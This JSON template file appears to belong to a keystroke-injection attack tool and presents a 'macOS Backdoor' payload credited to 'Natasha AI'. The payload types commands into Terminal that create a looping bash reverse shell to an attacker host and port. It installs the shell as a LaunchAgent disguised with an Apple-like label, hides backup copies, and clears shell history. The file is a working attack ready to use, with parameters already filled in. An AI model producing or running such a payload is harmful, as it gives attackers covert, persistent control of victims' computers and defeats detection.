{
  "metadata": {
    "name": "macOS Backdoor",
    "description": "Creates persistent backdoor access on macOS systems",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "LaunchAgent Reverse Shell",
      "description": "Creates a LaunchAgent that establishes a reverse shell connection",
      "attack_type": "backdoor",
      "script": [
        "REM macOS LaunchAgent Reverse Shell Backdoor",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "GUI SPACE",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/Library/LaunchAgents",
        "ENTER",
        "DELAY 300",
        "STRING ATTACKER_IP=&quot;ATTACKER_IP&quot;  # Replace with actual IP in parameters",
        "ENTER",
        "STRING ATTACKER_PORT=&quot;ATTACKER_PORT&quot;  # Replace with actual port in parameters",
        "ENTER",
        "STRING cat > ~/Library/Scripts/system_service.sh << 'EOF'",
        "ENTER",
        "STRING #!/bin/bash",
        "ENTER",
        "STRING # macOS System Service",
        "ENTER",
        "STRING while true; do",
        "ENTER",
        "STRING   sleep 10",
        "ENTER",
        "STRING   bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 2>/dev/null",
        "ENTER",
        "STRING done",
        "ENTER",
        "STRING EOF",
        "ENTER",
        "DELAY 300",
        "STRING chmod +x ~/Library/Scripts/system_service.sh",
        "ENTER",
        "DELAY 300",
        "STRING cat > ~/Library/LaunchAgents/com.apple.systemservice.plist << EOF",
        "ENTER",
        "STRING <?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?>",
        "ENTER",
        "STRING <!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;>",
        "ENTER",
        "STRING <plist version=&quot;1.0&quot;>",
        "ENTER",
        "STRING <dict>",
        "ENTER",
        "STRING   <key>Label</key>",
        "ENTER",
        "STRING   <string>com.apple.systemservice</string>",
        "ENTER",
        "STRING   <key>ProgramArguments</key>",
        "ENTER",
        "STRING   <array>",
        "ENTER",
        "STRING     <string>/bin/bash</string>",
        "ENTER",
        "STRING     <string>$HOME/Library/Scripts/system_service.sh</string>",
        "ENTER",
        "STRING   </array>",
        "ENTER",
        "STRING   <key>RunAtLoad</key>",
        "ENTER",
        "STRING   <true/>",
        "ENTER",
        "STRING   <key>KeepAlive</key>",
        "ENTER",
        "STRING   <true/>",
        "ENTER",
        "STRING   <key>StandardErrorPath</key>",
        "ENTER",
        "STRING   <string>/dev/null</string>",
        "ENTER",
        "STRING   <key>StandardOutPath</key>",
        "ENTER",
        "STRING   <string>/dev/null</string>",
        "ENTER",
        "STRING </dict>",
        "ENTER",
        "STRING </plist>",
        "ENTER",
        "STRING EOF",
        "ENTER",
        "DELAY 300",
        "STRING launchctl load ~/Library/LaunchAgents/com.apple.systemservice.plist",
        "ENTER",
        "DELAY 300",
        "STRING # Create a hidden copy for persistence",
        "ENTER",
        "STRING mkdir -p ~/.hidden",
        "ENTER",
        "STRING cp ~/Library/Scripts/system_service.sh ~/.hidden/",
        "ENTER",
        "STRING cp ~/Library/LaunchAgents/com.apple.systemservice.plist ~/.hidden/",
        "ENTER",
        "DELAY 300",
        "STRING # Clean up history",
        "ENTER",
        "STRING history -c",
        "ENTER",
        "DELAY 300",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "ATTACKER_IP": "192.168.1.100",
        "ATTACKER_PORT": "4444"
      }
    }
  ]
}